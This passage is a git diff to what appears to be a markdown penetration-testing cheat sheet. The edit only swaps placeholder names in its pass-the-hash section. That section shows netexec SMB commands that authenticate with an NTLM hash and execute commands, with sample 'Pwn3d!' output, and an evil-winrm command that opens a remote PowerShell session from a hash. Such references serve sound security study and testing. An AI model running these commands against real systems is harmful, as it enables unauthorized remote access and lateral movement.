@@ -4061,16 +4061,16 @@ netexec smb 172.16.1.0/24 -u Administrator -d . -H <HASH>
 We can use the option -x to execute commands.
 
 ```bash
-netexec smb <DOMAIN_IP> -u Administrator -d . -H <HASH> -x whoami
+netexec smb <IP> -u Administrator -d . -H <HASH> -x whoami
 ```
 
 **Expcted output**
 
 ```bash
-# SMB         <DOMAIN_IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
-# SMB         <DOMAIN_IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
-# SMB         <DOMAIN_IP>  445    MS01            [+] Executed command 
-# SMB         <DOMAIN_IP>  445    MS01            MS01\administrator
+# SMB         <IP>  445    MS01            [*] Windows 10 Enterprise 10240 x64 (name:MS01) (domain:.) (signing:False) (SMBv1:True)
+# SMB         <IP>  445    MS01            [+] .\Administrator <HASH> (Pwn3d!)
+# SMB         <IP>  445    MS01            [+] Executed command 
+# SMB         <IP>  445    MS01            MS01\administrator
 ```
 
 </details>
@@ -4091,7 +4091,7 @@ Evil‑WinRM leverages WinRM (PowerShell Remoting) over HTTP(S) and doesn’t re
 As long as the account belongs to Remote Management Users or equivalent, you can authenticate using an NTLM hash and spawn a remote PowerShell session.
 
 ```bash
-evil-winrm -i <DOMAIN_IP> -u Administrator -H <HASH>
+evil-winrm -i <IP> -u <USER> -H <HASH>
 ```
 
 **Expcted output**
